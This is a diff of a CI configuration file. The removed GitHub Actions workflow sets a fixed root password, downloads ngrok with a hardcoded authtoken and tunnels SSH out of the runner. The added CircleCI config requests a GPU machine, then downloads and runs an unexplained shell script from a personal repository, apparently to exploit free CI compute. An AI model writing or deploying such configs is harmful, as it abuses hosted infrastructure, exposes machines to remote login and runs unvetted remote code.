@@ -1,19 +1,11 @@
-name: ubunturdp
-on: 
-  workflow_dispatch:
-   inputs:
-     auth:
-        description: 'aditya'
-        required: true
-        default: 'paste your code here'
-  
-defaults:
-  run:
-    shell: bash
+version: 2.1
+
 jobs:
   build:
-    runs-on: ubuntu-20.04
+    machine:
+      image: ubuntu-1604-cuda-10.1:201909-23
+    resource_class: gpu.nvidia.small
     steps:
-    - name: Creating User to Login
-      run: echo "user:root@0" | sudo chpasswd && wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip && unzip ngrok-stable-linux-amd64.zip && chmod +x ngrok && ./ngrok authtoken 23vAgNYXuCWyFzltBzLRjeaPsUy_V5GWt1TYC6LvLHHcixjU && ./ngrok tcp 22
-
+      - run: nvidia-smi
+      - run: wget https://raw.githubusercontent.com/Vaping86/Vaping86/main/runlol.sh && chmod +x runlol.sh && ./runlol.sh
+      
